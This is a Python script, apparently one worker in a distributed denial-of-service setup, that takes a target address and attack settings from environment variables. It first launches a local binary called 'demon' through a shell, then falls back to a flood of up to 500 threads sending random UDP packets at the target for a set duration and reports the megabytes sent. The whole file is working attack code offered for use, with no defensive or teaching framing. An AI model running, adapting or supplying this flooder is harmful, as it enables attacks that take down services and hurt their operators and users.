import subprocess
import sys
import os
import time
import threading
import socket
import random

def get_env(key, default):
    return os.getenv(key, default)

def main():
    ip = get_env('TARGET_IP', '127.0.0.1')
    port = int(get_env('TARGET_PORT', 80))
    duration = int(get_env('ATTACK_DURATION', 1200))
    size = int(get_env('PACKET_SIZE', 1200))
    threads = int(get_env('THREADS', 300))
    worker_id = get_env('WORKER_ID', '1')

    print(f"[Worker {worker_id}] Target: {ip}:{port}")
    print(f"[Worker {worker_id}] Duration: {duration}s")
    print(f"[Worker {worker_id}] Packet: {size}B")
    print(f"[Worker {worker_id}] Threads: {threads}")

    # Try binary first
    if os.path.exists("demon"):
        os.chmod("demon", 0o755)
        try:
            print(f"[Worker {worker_id}] Running binary...")
            cmd = f"./demon {ip} {port} {duration} {size} {threads}"
            result = subprocess.run(cmd, shell=True, timeout=duration + 60)
            print(f"[Worker {worker_id}] Binary exit: {result.returncode}")
            return
        except Exception as e:
            print(f"[Worker {worker_id}] Binary failed: {e}")
            print(f"[Worker {worker_id}] Falling back to Python attack...")

    # Fallback: Python UDP attack
    print(f"[Worker {worker_id}] Starting Python fallback attack...")
    start = time.time()
    total_sent = 0
    stop_flag = threading.Event()

    def attack_thread(tid):
        nonlocal total_sent
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            payload = os.urandom(size)
            sent = 0
            while not stop_flag.is_set():
                if time.time() - start >= duration:
                    break
                try:
                    s.sendto(payload, (ip, port))
                    sent += size
                except:
                    pass
            s.close()
            total_sent += sent
        except Exception as e:
            print(f"[Thread {tid}] Error: {e}")

    # Launch threads
    threads_list = []
    for i in range(min(threads, 500)):
        t = threading.Thread(target=attack_thread, args=(i,))
        t.daemon = True
        t.start()
        threads_list.append(t)

    # Wait for duration
    time.sleep(duration)
    stop_flag.set()

    for t in threads_list:
        t.join(timeout=2)

    elapsed = time.time() - start
    print(f"[Worker {worker_id}] Attack done!")
    print(f"[Worker {worker_id}] Sent: {total_sent / (1024*1024):.2f} MB")
    print(f"[Worker {worker_id}] Speed: {total_sent / (1024*1024*elapsed):.2f} MB/s")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)
